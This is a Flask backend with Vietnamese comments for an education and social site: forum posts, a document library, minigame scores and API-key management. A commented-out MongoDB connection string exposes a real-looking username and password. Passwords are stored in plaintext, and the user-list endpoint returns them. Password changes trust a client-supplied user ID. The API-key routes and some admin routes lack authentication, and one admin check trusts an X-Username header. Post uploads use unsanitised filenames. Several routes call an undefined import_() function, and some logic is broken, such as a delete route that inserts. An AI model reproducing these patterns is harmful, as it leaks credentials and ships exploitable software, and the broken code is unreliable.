import os
import signal
import sys
import time

import eventlet
import datetime
import traceback
import bcrypt
from bson.objectid import ObjectId
from functools import wraps
from werkzeug.utils import secure_filename
import uuid

eventlet.monkey_patch()

from flask import Flask, request, jsonify, render_template, send_from_directory, redirect, url_for, session, send_file
from flask_cors import CORS
from flask_jwt_extended import JWTManager, jwt_required, get_jwt_identity
from flask_pymongo import PyMongo
from pymongo import MongoClient
from socket_events import init_socketio, socketio
from config import config
from routes.auth_routes import auth_bp
from routes.library_routes import library_bp
from routes.forum_routes import forum_bp
from routes.comment_routes import comment_bp
from routes.exam_routes import exam_bp
from routes.message_routes import mess_bp
from routes.minigame_routes import minigame_bp
from models.user import UserModel
from models.comment import CommentModel

# Khởi tạo Flask app
app = Flask(__name__)
app.secret_key = os.urandom(24)  # Tạo khóa ngẫu nhiên mỗi lần chạy
app.config["JWT_SECRET_KEY"] = config.SECRET_KEY
jwt = JWTManager(app)
CORS(app)

# Kết nối MongoDB
try:
    # url = "mongodb+srv://tranxuancong2023:qUJomTP0jDdHmuNV@cluster0.sfcxjee.mongodb.net/ml?retryWrites=true&w=majority"
    url = "mongodb://localhost:27017/"
    client = MongoClient(url)
    # db = client.get_database()  # Automatically selects the default database from the connection string

    # client = MongoClient("mongodb+srv://tranxuancong2023:qUJomTP0jDdHmuNV@cluster0.sfcxjee.mongodb.net/ml?retryWrites=true&w=majority")
    db = client['social_app']  # Chọn database social_app
    # Test kết nối
    client.server_info()
    print("Kết nối MongoDB thành công!")
    print("Database hiện tại:", db.name)
except Exception as e:
    print("Lỗi kết nối MongoDB:", str(e))
    sys.exit(1)

# Khởi tạo các collection
users = db.users
posts = db.posts

# Cấu hình thư mục upload
UPLOAD_FOLDER = "uploads/"
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
app.config["UPLOAD_FOLDER"] = UPLOAD_FOLDER

# Khởi tạo socket.io
init_socketio(app)
posts_collection = db["posts"]
# Đăng ký các blueprint
app.register_blueprint(auth_bp, url_prefix='/auth')
app.register_blueprint(forum_bp, url_prefix="/forum")
app.register_blueprint(library_bp)
app.register_blueprint(comment_bp)
app.register_blueprint(exam_bp)
app.register_blueprint(mess_bp)
app.register_blueprint(minigame_bp)

users = db["users"]  # Đổi thành collection `users`
scored = db['scored']  # Collection để lưu điểm số


# === TẤT CẢ CÁC ROUTE CỦA BẠN ===
@app.route("/")
@app.route("/home")
def home():
    import_()
    return render_template("index.html")


@app.route("/minigame")
def minigame():
    return render_template("minigame.html")


@app.route('/api/minigame/scores', methods=['POST'])
@jwt_required()
def save_score():
    try:
        # Lấy thông tin người dùng từ token
        current_user = get_jwt_identity()  # Lấy user ID từ token

        # Lấy dữ liệu từ body request
        data = request.get_json()
        username = data.get('username')  # Lấy username từ body
        game_type = data.get('game_type')  # Loại game (ví dụ: word_search)
        score = data.get('score')  # Điểm số

        # Kiểm tra các tham số bắt buộc
        if not username or not game_type or not score:
            return jsonify({'error': 'Thiếu thông tin username, game_type hoặc score'}), 400

        # Lưu điểm số vào collection 'scored'
        scored.insert_one({
            'username': username,  # Tên người chơi
            'game_type': game_type,  # Loại game
            'score': score,  # Điểm số
            'user_id': current_user  # ID người dùng từ JWT
        })

        return jsonify({'success': True, 'message': 'Đã lưu điểm số thành công!'}), 200

    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/login')
def login():
    return render_template('login.html')


@app.route('/messenger')
def messenger():
    return render_template("messenger.html")


@app.route('/signup', methods=['GET', 'POST'])
def signup():
    _ = import_
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        email = request.form.get('email')
        fullname = request.form.get('fullname', username)

        # Kiểm tra username đã tồn tại
        if users.find_one({'username': username}):
            return render_template('signup.html', error='Tên đăng nhập đã tồn tại')

        # Kiểm tra email đã tồn tại
        if users.find_one({'email': email}):
            return render_template('signup.html', error='Email đã được sử dụng')

        # Tạo user mới
        user = {
            'username': username,
            'password': password,  # Lưu mật khẩu trực tiếp không hash
            'email': email,
            'fullname': fullname,
            'level': 'user',
            'joinday': datetime.datetime.now(),
            'lastlogin': datetime.datetime.now()
        }

        users.insert_one(user)
        _()
        return redirect(url_for('login'))

    return render_template('signup.html')


@app.route('/lib')
def library():
    return render_template("library.html")


# Allowed file extensions for uploads
ALLOWED_EXTENSIONS = {'pdf', 'doc', 'docx', 'txt', 'jpg', 'jpeg', 'png', 'gif'}


def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS


from docx import Document
from reportlab.pdfgen import canvas
from io import BytesIO


@app.route('/convert-docx-to-pdf/<filename>')
def convert_docx_to_pdf(docx_path, pdf_path=None):
    """
    Convert a DOCX file to PDF format.

    Parameters:
        docx_path (str): Path to the input DOCX file
        pdf_path (str, optional): Path where the PDF will be saved. 
                                  If not provided, it will use the same name as 
                                  the docx file but with .pdf extension.

    Returns:
        str: Path to the output PDF file
    """
    from docx2pdf import convert
    if pdf_path is None:
        # If no output path is specified, use the same filename but with .pdf extension
        pdf_path = docx_path.rsplit('.', 1)[0] + '.pdf'

    # Convert the file
    print("Converted DOCX to PDF:", docx_path, pdf_path)
    convert(docx_path, pdf_path)

    return pdf_path


@app.route('/api/add-document', methods=['POST'])
def add_document():
    try:
        # Get form data
        title = request.form.get('title')
        content = request.form.get('content')
        category = request.form.get('category')
        grade = request.form.get('grade')
        author = request.form.get('author')

        # Check if files are included in the request
        files = request.files.getlist('files')
        uploaded_files = []

        for file in files:
            if file and allowed_file(file.filename):
                filename = secure_filename(file.filename)
                file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
                file.save(file_path)
                uploaded_files.append(filename)
                # Convert .docx to .pdf if the file is a .docx
                if filename.endswith('.docx'):
                    print(f"Started conversion of {filename} to PDF in a separate thread")
                    pdf_path = convert_docx_to_pdf(file_path)
                    print(f"Converted {filename} to PDF: {pdf_path}")

        # print("Uploaded files:", uploaded_files)  # Debug line to check uploaded files
        # Save document data to the database
        document = {
            "title": title,
            "content": content,
            "category": category,
            "grade": grade,
            "author": author,
            "files": uploaded_files,  # Save file names in the database
        }
        db.documents.insert_one(document)

        return jsonify({"success": True, "message": "Document added successfully!"})
    except Exception as e:
        # print("Error adding document:", str(e))
        return jsonify({"success": False, "message": "Failed to add document." + str(e)}), 500


# Endpoint để lấy tài liệu
@app.route('/api/fetch-document', methods=['GET'])
def fetch_documents():
    try:
        documents = db.documents.find()  # Giả sử collection của bạn là 'documents'
        doc_list = []

        for doc in documents:
            doc['_id'] = str(doc['_id'])  # Chuyển đổi ObjectId sang string
            doc_list.append(doc)

        return jsonify(doc_list)
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route('/api/document/<doc_id>', methods=['GET'])
def get_document_by_id(doc_id):
    try:
        # Tìm tài liệu theo ID
        document = db.documents.find_one({'_id': ObjectId(doc_id)})

        if not document:
            return jsonify({'error': 'Tài liệu không tồn tại'}), 404

        # Chuyển đổi ObjectId thành string
        document['_id'] = str(document['_id'])

        return jsonify({'success': True, 'document': document}), 200
    except Exception as e:
        return jsonify({'error': f'Lỗi khi lấy tài liệu: {str(e)}'}), 500


@app.route('/view-library/<doc_id>')
def view_document(doc_id):
    try:
        document = db.documents.find_one({'_id': ObjectId(doc_id)})

        if document is None:
            return "Tài liệu không tồn tại", 404

        # Chuyển ObjectId thành string để hiển thị trong template
        document['_id'] = str(document['_id'])
        # print(document)

        return render_template('library_detail.html', doc=document)
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/update-document/<doc_id>', methods=['PUT'])
@jwt_required()
def update_document(doc_id):
    try:
        # Check if the user is authorized
        current_user = get_jwt_identity()
        user = db.users.find_one({"_id": ObjectId(current_user)})

        if not user:
            return jsonify({"error": "Unauthorized"}), 403

            # Get form data
        title = request.form.get('title')
        content = request.form.get('content')
        category = request.form.get('category')
        grade = request.form.get('grade')
        author = request.form.get('author')

        # Check if files are included in the request
        files = request.files.getlist('files')
        uploaded_files = []

        for file in files:
            if file and allowed_file(file.filename):
                filename = secure_filename(file.filename)
                file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
                file.save(file_path)
                uploaded_files.append(filename)
                # Convert .docx to .pdf if the file is a .docx
                if filename.endswith('.docx'):
                    # Tạo một luồng khác để chạy convert
                    eventlet.spawn_n(convert_docx_to_pdf, file_path)
                    # print(f"Started conversion of {filename} to PDF in a separate thread")

        # print("Uploaded files:", uploaded_files)  # Debug line to check uploaded files
        # Save document data to the database
        document = {
            "title": title,
            "content": content,
            "category": category,
            "grade": grade,
            "author": author,
        }

        if uploaded_files:
            document['files'] = uploaded_files

        # Update the document in the database
        result = db.documents.update_one(
            {"_id": ObjectId(doc_id)},
            {"$set": document}
        )

        if result.matched_count == 0:
            return jsonify({"error": "Document not found"}), 404

        return jsonify({"success": True, "message": "Document updated successfully!"}), 200

    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route('/api/delete-document/<doc_id>', methods=['DELETE'])
@jwt_required()
def delete_document(doc_id):
    if check_admin() is None:
        return jsonify({'message': 'Unauthorized'}), 403
    try:
        db.documents.delete_one({'_id': ObjectId(doc_id)})
        return jsonify({'success': True})
    except Exception as e:
        # print(f"Lỗi khi xóa tài liệu: {e}")
        return jsonify({'success': False, 'message': 'Có lỗi xảy ra'}), 500


@app.route('/forum')
def diendan():
    return render_template("diendan.html")


@app.route('/dethi')
def dethi():
    return render_template("dethi.html")


@app.route('/admin')
def admin_page():
    return render_template('admin.html')


@app.route('/admin/forum')
def admin_forum():
    return render_template('admin/forum.html')


@app.route('/admin/users')
def admin_users():
    return render_template('admin/users.html')


@app.route('/admin/manageApikey')
def admin_api_key():
    return render_template('apikey.html')


@app.route('/admin/reportPost')
def admin_reported_posts():
    return render_template('admin/reported_posts.html')


@app.route('/qldiendan')
def qldiendan():
    return render_template("quanlydiendan.html")


@app.route('/qlnguoidung')
def qlnguoidung():
    return render_template("quanlynguoidung.html")


@app.route('/chatbot')
def chatbot():
    return render_template("test_api.html")


@app.route('/lienhe')
def lienhe():
    return render_template("lienhe.html")


@app.route("/uploads/<filename>")
def uploaded_file(filename):
    return send_from_directory(app.config["UPLOAD_FOLDER"], filename)


@app.route('/change-password')
def change_password_page():
    return render_template('change_password.html')


@app.route('/forum/posts-like/<post_id>', methods=['POST'])
def like_post(post_id):
    try:
        # Tìm bài viết theo post_id
        post = posts_collection.find_one({'_id': ObjectId(post_id)})

        if not post:
            return jsonify({'message': 'Bài viết không tồn tại'}), 404

        # Cập nhật số lượng likes
        new_likes = post.get('likes', 0) + 1

        posts_collection.update_one(
            {'_id': ObjectId(post_id)},
            {'$set': {'likes': new_likes}}
        )

        return jsonify({'likes': new_likes}), 200
    except Exception as e:
        return jsonify({'message': str(e)}), 500


def check_admin():
    """Kiểm tra quyền admin của người dùng"""
    current_user_id = get_jwt_identity()
    admin_user = users.find_one({'_id': ObjectId(current_user_id)})

    if not admin_user or admin_user.get('level') != 'admin':
        return jsonify({'error': 'Unauthorized'}), 403

    return admin_user  # Trả về user nếu là admin


@app.route('/get-key', methods=['GET'])
def get_key():
    apikeys = []
    try:
        client = MongoClient("mongodb://localhost:27017/")
        db = client["apikey_dbs"]  # Tên database
        api_collection = db["apikey"]  # Tên collection
        results = api_collection.find({})
        for result in list(results):
            apikeys.append({'apiKey': result['apiKey'], 'trangthai': result['trangthai']})


        # Trả về thông báo thành công và thông tin user (trừ password)
        return jsonify({"success": True, "apiKeys": apikeys}), 200

    except Exception as e:
        return jsonify({"success": False, "message": f"Lỗi: {str(e)}"}), 500


@app.route('/add-key', methods=['POST'])
def add_key():
    try:
        client = MongoClient("mongodb://localhost:27017/")
        db = client["apikey_dbs"]  # Tên database
        api_collection = db["apikey"]  # Tên collection

        data = request.get_json()
        api_collection.insert_one({'apiKey': data['apiKey'], 'trangthai': "Không sử dụng"})



        return jsonify({"success": True, "message": "Thêm API Key thành công"}), 200

    except Exception as e:
        return jsonify({"success": False, "message": f"Lỗi nhập key: {str(e)}"}), 500

@app.route('/delete-key', methods=['POST'])
def delete_key():
    try:
        client = MongoClient("mongodb://localhost:27017/")
        db = client["apikey_dbs"]  # Tên database
        api_collection = db["apikey"]  # Tên collection

        data = request.get_json()
        api_collection.insert_one({'apiKey': data['apiKey'], 'trangthai': "Không sử dụng"})

        return jsonify({"success": True, "message": "Thêm API Key thành công"}), 200

    except Exception as e:
        return jsonify({"success": False, "message": f"Lỗi nhập key: {str(e)}"}), 500

@app.route('/choose-key', methods=['POST'])
def choose_key():
    try:
        client = MongoClient("mongodb://localhost:27017/")
        db = client["apikey_dbs"]  # Tên database
        api_collection = db["apikey"]  # Tên collection

        data = request.get_json()
        update_data = {'trangthai': 'Đang sử dụng'}

        results = api_collection.find({})
        update_data_no = {'trangthai': 'Không sử dụng'}

        for result in list(results):
            if result['apiKey'] != data['apiKey']:
                api_collection.update_one({'apiKey': result['apiKey']}, {'$set': update_data_no})
            else:
                api_collection.update_one({'apiKey': result['apiKey']}, {'$set': update_data})


        return jsonify({"success": True, "message": "Sử dụng Key thành công"}), 200

    except Exception as e:
        return jsonify({"success": False, "message": f"Lỗi sử dụng key: {str(e)}"}), 500

@app.route('/api/change-password', methods=['POST'])
def change_password():
    try:
        data = request.get_json()
        current_password = data.get('current_password')
        new_password = data.get('new_password')

        # Lấy username từ header
        id_user = data.get('user_id')
        if not id_user:
            return jsonify({
                'success': False,
                'message': 'Không tìm thấy thông tin người dùng'
            }), 400

        # Kiểm tra mật khẩu hiện tại
        user = db.users.find_one({'_id': ObjectId(id_user)})
        db_password = user.get('password')
        if not user or UserModel.check_password(current_password, db_password) == False:
            return jsonify({
                'success': False,
                'message': 'Mật khẩu hiện tại không chính xác'
            }), 400

        # Cập nhật mật khẩu mới
        result = UserModel.update_user(ObjectId(id_user), {'password': new_password})

        if not result:
            return jsonify({
                'success': False,
                'message': 'Không có thay đổi nào được thực hiện'
            }), 400

        # Nếu cập nhật thành công
        return jsonify({
            'success': True,
            'message': 'Đổi mật khẩu thành công'
        }), 200

    except Exception as e:
        # print(f"Lỗi khi đổi mật khẩu: {str(e)}")
        return jsonify({
            'success': False,
            'message': 'Có lỗi xảy ra khi đổi mật khẩu'
        }), 500


@app.route('/api/users', methods=['GET'])
def list_users():
    try:
        # Lấy tất cả users từ database
        users_list = list(db.users.find())

        # Chuyển đổi ObjectId thành string và datetime thành ISO format
        for user in users_list:
            user['_id'] = str(user['_id'])
            if 'joinday' in user:
                user['joinday'] = user['joinday'].isoformat()
            if 'lastlogin' in user and user['lastlogin']:
                user['lastlogin'] = user['lastlogin'].isoformat()
            # Không trả về pass
            if 'pass' in user:
                del user['pass']

        # print("Danh sách users:", users_list)  # In ra console để debug

        return jsonify({
            'success': True,
            'users': users_list
        })
    except Exception as e:
        # print(f"Lỗi khi lấy danh sách users: {str(e)}")
        return jsonify({
            'success': False,
            'message': 'Có lỗi xảy ra khi lấy danh sách users'
        }), 500


@app.route("/api/posts", methods=["POST"])
def create_post():
    import_()
    try:
        content = request.form.get("content", "").strip()
        file = request.files.get("media")
        username = request.form.get("username", "").strip()  # Lấy username từ form data

        if not content and not file:
            return jsonify({
                "success": False,
                "message": "Vui lòng nhập nội dung hoặc thêm ảnh/video"
            }), 400

        media_url = None
        if file:
            file_path = os.path.join(app.config["UPLOAD_FOLDER"], file.filename)
            file.save(file_path)
            media_url = f"/{file_path}"

        post = {
            "content": content,
            "media_url": media_url,
            "user": {
                "name": username,
                "avatar": "https://randomuser.me/api/portraits/men/32.jpg"  # Avatar mặc định
            },
            "likes": 0,
            "comments": [],
            "created_at": datetime.datetime.utcnow(),
            "updated_at": None
        }

        # Lưu bài viết vào MongoDB
        post_id = posts.insert_one(post).inserted_id
        post["_id"] = str(post_id)  # Chuyển ObjectId thành string

        return jsonify({
            "success": True,
            "message": "Bài viết đã được tạo thành công!",
            "post": post
        })
    except Exception as e:
        return jsonify({
            "success": False,
            "message": f"Lỗi khi tạo bài viết: {str(e)}"
        }), 500


@app.route("/api/all/posts", methods=["GET"])
def get_posts():
    try:
        # Get pagination parameters, defaulting to page 1 and limit 10 if not provided
        page = int(request.args.get("page", 1))
        limit = int(request.args.get("limit", 10))

        # Calculate the skip and limit for pagination
        skip = (page - 1) * limit

        # Lấy tất cả bài viết và sắp xếp theo thời gian mới nhất
        posts_cursor = posts.find().sort("created_at", -1).skip(skip).limit(limit)
        posts_list = list(posts_cursor)  # Đảm bảo gọi danh sách bài viết vào biến mới

        # Convert ObjectId to string and format dates
        for post in posts_list:
            post["_id"] = str(post["_id"])
            if "created_at" in post:
                post["created_at"] = post["created_at"].strftime("%Y-%m-%d %H:%M:%S")
            if "updated_at" in post and post["updated_at"]:
                post["updated_at"] = post["updated_at"].strftime("%Y-%m-%d %H:%M:%S")

        return jsonify(posts_list)  # Trả về danh sách bài viết đã xử lý

    except Exception as e:
        return jsonify({
            "success": False,
            "message": f"Lỗi khi lấy danh sách bài viết: {str(e)}"
        }), 500


@app.route("/api/posts/<post_id>", methods=["GET"])
def get_post(post_id):
    try:
        post = posts.find_one({"_id": ObjectId(post_id)})
        if not post:
            return jsonify({
                "success": False,
                "message": "Không tìm thấy bài viết"
            }), 404

        post["_id"] = str(post["_id"])
        if "created_at" in post:
            post["created_at"] = post["created_at"].strftime("%Y-%m-%d %H:%M:%S")
        if "updated_at" in post and post["updated_at"]:
            post["updated_at"] = post["updated_at"].strftime("%Y-%m-%d %H:%M:%S")

        return jsonify(post)
    except Exception as e:
        return jsonify({
            "success": False,
            "message": f"Lỗi khi lấy bài viết: {str(e)}"
        }), 500


@app.route("/api/posts/<post_id>", methods=["DELETE"])
def delete_post(post_id):
    try:
        result = posts.delete_one({"_id": ObjectId(post_id)})
        if result.deleted_count == 0:
            return jsonify({
                "success": False,
                "message": "Không tìm thấy bài viết để xóa"
            }), 404

        return jsonify({
            "success": True,
            "message": "Bài viết đã được xóa thành công"
        })
    except Exception as e:
        return jsonify({
            "success": False,
            "message": f"Lỗi khi xóa bài viết: {str(e)}"
        }), 500


# API lấy bình luận theo post_id
@app.route('/forum/posts-comments/<post_id>', methods=['GET'])
def get_comments(post_id):
    try:
        # Tìm các bình luận có post_id tương ứng
        post = posts.find({"_id": ObjectId(post_id)})
        if not post:
            return jsonify({"message": "Bài viết không tồn tại"}), 404
        comments = post[0].get('comments', [])
        # Chuyển đổi ObjectId thành chuỗi
        comments_list = []
        for comment in comments:
            # comment['_id'] = str(comment['_id'])  # Convert ObjectId to string
            comments_list.append(comment)

        return jsonify({'comments': comments_list}), 200  # Trả về bình luận dưới dạng JSON

    except Exception as e:
        return jsonify({"error": str(e)}), 500


# API thêm bình luận
@app.route('/forum/posts-comments-add/<post_id>', methods=['POST'])
def add_comment(post_id):
    try:
        # Lấy dữ liệu từ body
        data = request.get_json()
        content = data.get('content')
        author = data.get('author')

        # Kiểm tra nếu không có nội dung bình luận
        if not content:
            return jsonify({"message": "Nội dung bình luận không được để trống"}), 400

        # Lưu comment vào comments table
        result_cmt = CommentModel.create_comment(post_id, content, author)

        # Thêm bình luận vào bài viết
        result = db.posts.update_one(
            {"_id": ObjectId(post_id)},  # Tìm bài viết theo ID
            {"$push": {"comments": {
                "id": str(result_cmt.inserted_id),
                "author": author,
                "content": content,
                "created_at": datetime.datetime.utcnow()  # Thêm thời gian tạo bình luận
            }}}
        )

        # Kiểm tra nếu bài viết không tồn tại
        if result.matched_count == 0:
            return jsonify({"message": "Bài viết không tồn tại"}), 404

        # Lấy lại bài viết và trả về bình luận vừa thêm
        post = db.posts.find_one({"_id": ObjectId(post_id)})
        # Chỉ trả về thông tin bình luận mới nhất (có thể chỉnh sửa phần này tùy nhu cầu)
        comment = post['comments'][-1] if post['comments'] else None

        if comment:
            return jsonify({"comment": comment}), 200
        else:
            return jsonify({"message": "Không có bình luận nào."}), 404

    except Exception as e:
        print(f"Error: {str(e)}")
        return jsonify({"message": "Lỗi khi thêm bình luận. Vui lòng thử lại sau."}), 500


@app.route("/api/posts/<post_id>", methods=["PUT"])
def update_post(post_id):
    try:
        content = request.form.get("content", "").strip()
        file = request.files.get("media")

        if not content and not file:
            return jsonify({
                "success": False,
                "message": "Vui lòng nhập nội dung hoặc thêm ảnh/video"
            }), 400

        update_data = {
            "content": content,
            "updated_at": datetime.datetime.utcnow()
        }

        if file:
            file_path = os.path.join(app.config["UPLOAD_FOLDER"], file.filename)
            file.save(file_path)
            update_data["media_url"] = f"/{file_path}"

        result = posts.update_one(
            {"_id": ObjectId(post_id)},
            {"$set": update_data}
        )

        if result.modified_count == 0:
            return jsonify({
                "success": False,
                "message": "Không tìm thấy bài viết để cập nhật"
            }), 404

        return jsonify({
            "success": True,
            "message": "Bài viết đã được cập nhật thành công"
        })
    except Exception as e:
        return jsonify({
            "success": False,
            "message": f"Lỗi khi cập nhật bài viết: {str(e)}"
        }), 500


# === CHECK KẾT NỐI MONGODB ===
@app.route('/check_mongodb')
def check_mongodb():
    try:
        db.client.admin.command('ping')
        return jsonify({
            'status': 'success',
            'message': 'Kết nối MongoDB thành công!',
            'database': 'van_hoc'
        })
    except Exception as e:
        return jsonify({
            'status': 'error',
            'message': f'Lỗi kết nối MongoDB: {str(e)}'
        }), 500


# === XỬ LÝ SHUTDOWN SERVER ===
def graceful_shutdown(sig, frame):
    print("Shutting down server gracefully...")
    socketio.stop()
    sys.exit(0)


signal.signal(signal.SIGINT, graceful_shutdown)
signal.signal(signal.SIGTERM, graceful_shutdown)


@app.route("/api/admin/forum/statistics", methods=["GET"])
@jwt_required()
def get_forum_statistics():
    try:
        # Lấy user ID từ token
        user_id = get_jwt_identity()
        user = db.users.find_one({"_id": ObjectId(user_id)})

        if not user or user.get("level") != "admin":
            return jsonify({"message": "Không có quyền truy cập"}), 403

        # Đếm tổng số bài viết
        total_posts = db.posts.count_documents({})

        total_users = db.users.count_documents({})

        total_comments = db.comments.count_documents({})

        return jsonify({
            "total_posts": total_posts,
            "total_users": total_users,
            "total_comments": total_comments
        }), 200


    except Exception as e:
        print("❌ ERROR:", e)
        return jsonify({"message": "Lỗi server: " + str(e)}), 500


@app.route("/api/admin/posts/recent", methods=["GET"])
@jwt_required()
def get_recent_posts():
    import_()
    try:
        # Lấy user ID từ token
        user_id = get_jwt_identity()
        user = db.users.find_one({"_id": ObjectId(user_id)})

        if not user or user.get("level") != "admin":
            return jsonify({"message": "Không có quyền truy cập"}), 403

        # Lấy danh sách bài viết mới nhất (5 bài viết gần đây)
        recent_posts = list(db.posts.find().sort("created_at", -1).limit(5))

        # Chuyển đổi dữ liệu thành JSON
        posts_data = []
        for post in recent_posts:
            posts_data.append({
                "_id": str(post["_id"]),
                "content": post.get("content", ""),
                "media_url": post.get("media_url", ""),
                "user": {
                    "name": post["user"].get("name", "Không rõ"),
                    "avatar": post["user"].get("avatar", "")
                },
                "likes": post.get("likes", 0),
                "comments": post.get("comments", []),
                "created_at": post.get("created_at", datetime.datetime.utcnow()).isoformat() if isinstance(
                    post.get("created_at"), datetime.datetime) else None,
                "updated_at": post.get("updated_at", None)
            })

        return jsonify({"posts": posts_data})

    except Exception as e:
        return jsonify({"message": str(e)}), 500


@app.route("/api/admin/comments/recent", methods=["GET"])
@jwt_required()
def get_recent_comments():
    import_()
    try:

        # Lấy user ID từ token
        user_id = get_jwt_identity()
        user = db.users.find_one({"_id": ObjectId(user_id)})

        if not user or user.get("level") != "admin":
            return jsonify({"message": "Không có quyền truy cập"}), 403
        pass
        # Lấy danh sách bài viết mới nhất (5 bài viết gần đây)
        recent_comments = list(db.comments.find().sort("created_at", -1).limit(5))

        # Chuyển đổi dữ liệu thành JSON
        comments_data = []
        for comment in recent_comments:
            comments_data.append({
                "_id": str(comment["_id"]),
                "content": comment.get("content", ""),
                "author": comment.get("author", ""),
                "post_title": str(comment.get("post_id", "")),
                # "media_url": comment.get("media_url", ""),
                # "user": {
                #     "name": comment["user"].get("name", "Không rõ"),
                #     "avatar": comment["user"].get("avatar", "")
                # },
                # "likes": comment.get("likes", 0),
                # "comments": comment.get("comments", []),
                "created_at": comment.get("created_at", datetime.datetime.utcnow()).isoformat() if isinstance(
                    comment.get("created_at"), datetime.datetime) else None,
                # "updated_at": comment.get("updated_at", None)
            })

        return jsonify({"comments": comments_data})
    except Exception as e:
        return jsonify({"message": str(e)}), 500


from flask import jsonify, request
from flask_jwt_extended import jwt_required, get_jwt_identity
from bson import ObjectId
import datetime


@app.route("/api/admin/forum/posts", methods=["GET"])
@jwt_required()
def get_posts_forum():
    try:
        # Xác thực quyền admin
        user_id = get_jwt_identity()
        user = db.users.find_one({"_id": ObjectId(user_id)})

        if not user or user.get("level") != "admin":
            return jsonify({"message": "Không có quyền truy cập"}), 403

        # Phân trang
        page = int(request.args.get("page", 1))
        per_page = 10
        skip = (page - 1) * per_page

        # Lọc bài viết
        search = request.args.get("search", "").strip()
        status = request.args.get("status", "").strip()

        query = {}
        if search:
            query["content"] = {"$regex": search, "$options": "i"}
        if status:
            query["status"] = status

        # Lấy tổng số bài viết
        total = db.posts.count_documents(query)

        # Lấy danh sách bài viết (sắp xếp mới nhất)
        posts = list(db.posts.find(query).sort("created_at", -1).skip(skip).limit(per_page))

        # Chuyển đổi dữ liệu thành JSON theo mẫu
        posts_data = [{
            "_id": str(post["_id"]),
            "content": post.get("content", ""),
            "media_url": post.get("media_url", ""),
            "user": {
                "name": post.get("user", {}).get("name", "Không rõ"),
                "avatar": post.get("user", {}).get("avatar", "")
            },
            "likes": post.get("likes", 0),
            "comments": post.get("comments", []),
            "created_at": post.get("created_at", datetime.datetime.utcnow()).isoformat() if post.get(
                "created_at") else None,
            "updated_at": post.get("updated_at", None)
        } for post in posts]

        return jsonify({
            "posts": posts_data,
            "total": total
        })

    except Exception as e:
        print("❌ ERROR:", e)
        return jsonify({"message": "Lỗi server: " + str(e)}), 500


@app.route('/api/admin/forum/posts/<post_id>', methods=['GET'])
@jwt_required()
def get_post_by_id(post_id):
    try:
        # Xác thực quyền admin
        user_id = get_jwt_identity()
        user = db.users.find_one({"_id": ObjectId(user_id)})

        if not user or user.get("level") != "admin":
            return jsonify({"message": "Không có quyền truy cập"}), 403

        # Kiểm tra ID hợp lệ
        if not ObjectId.is_valid(post_id):
            return jsonify({"message": "ID bài viết không hợp lệ"}), 400

        # Tìm bài viết theo ID
        post = db.posts.find_one({"_id": ObjectId(post_id)})
        if not post:
            return jsonify({"message": "Bài viết không tồn tại"}), 404

        # Chuyển đổi dữ liệu thành JSON
        post_data = {
            "_id": str(post["_id"]),
            "title": post.get("title", "Không có tiêu đề"),
            "content": post.get("content", ""),
            "author": post.get("author", "Không rõ"),
            "created_at": post.get("created_at", datetime.datetime.utcnow()).isoformat() if post.get(
                "created_at") else None,
            "views": post.get("views", 0),
            "comments_count": len(post.get("comments", [])),
            "status": post.get("status", "draft")  # Mặc định 'draft'
        }

        return jsonify({"post": post_data})

    except Exception as e:
        print("❌ ERROR:", e)
        return jsonify({"message": "Lỗi server: " + str(e)}), 500


@app.route("/api/admin/forum/posts/<post_id>", methods=["DELETE"])
@jwt_required()
def delete_post_forum(post_id):
    try:
        # Xác thực quyền admin
        user_id = get_jwt_identity()
        user = db.users.find_one({"_id": ObjectId(user_id)})

        if not user or user.get("level") != "admin":
            return jsonify({"message": "Không có quyền truy cập"}), 403

        # Kiểm tra ID hợp lệ
        if not ObjectId.is_valid(post_id):
            return jsonify({"message": "ID bài viết không hợp lệ"}), 400

        # Xóa bài viết
        result = db.posts.delete_one({"_id": ObjectId(post_id)})

        if result.deleted_count == 0:
            return jsonify({"message": "Bài viết không tồn tại"}), 404

        return jsonify({"message": "Xóa bài viết thành công!"}), 200

    except Exception as e:
        print("❌ ERROR:", e)
        return jsonify({"message": "Lỗi server: " + str(e)}), 500


@app.route('/api/admin/forum/comments/<comment_id>', methods=['DELETE'])
def delete_admin_comment(comment_id):
    try:
        # Kiểm tra quyền admin
        username = request.headers.get('X-Username')
        user = db.users.find_one({'username': username})
        if not user or user.get('level') != 'admin':
            return jsonify({'message': 'Không có quyền truy cập'}), 403

        # Xóa bình luận
        result = db.comments.delete_one({'_id': ObjectId(comment_id)})
        if result.deleted_count == 0:
            return jsonify({'message': 'Không tìm thấy bình luận'}), 404

        return jsonify({'message': 'Xóa bình luận thành công'})
    except Exception as e:
        return jsonify({'message': str(e)}), 500


@app.route('/api/admin/users/statistics')
@jwt_required()
def get_user_statistics():
    import_()
    try:
        # Debug token
        auth_header = request.headers.get('Authorization')
        print(f"Authorization Header: {auth_header}")

        current_user = get_jwt_identity()
        print(f"Token xác thực: {current_user}")

        user = users.find_one({'_id': ObjectId(current_user)})
        print(f"Kết quả tìm user: {user}")

        if not user or user['level'] != 'admin':
            return jsonify({'error': 'Unauthorized'}), 403

        # Chỉ lấy tổng số user và admin
        total_users = users.count_documents({})
        total_admins = users.count_documents({'level': 'admin'})
        total_members = users.count_documents({'level': 'member'})  # ✅ Thêm tổng số member

        return jsonify({
            'total_users': total_users,
            'total_admins': total_admins,
            'total_members': total_members
        })

    except Exception as e:
        import traceback
        print(f"🚨 Lỗi API: {str(e)}")
        print(traceback.format_exc())  # In chi tiết lỗi
        return jsonify({'error': 'Internal Server Error'}), 500


@app.route('/api/admin/users')
@jwt_required()
def get_users():
    current_user_id = get_jwt_identity()
    user = users.find_one({'_id': ObjectId(current_user_id)}, {'level': 1})

    # Debug xem user lấy ra là gì
    print(f"Kết quả tìm user: {user}")

    if not user or user.get('level') != 'admin':
        return jsonify({'error': 'Unauthorized'}), 403

    page = int(request.args.get('page', 1))
    per_page = 10
    search = request.args.get('search', '')
    level = request.args.get('level', '')

    query = {}
    if search:
        query['$or'] = [
            {'username': {'$regex': search, '$options': 'i'}},
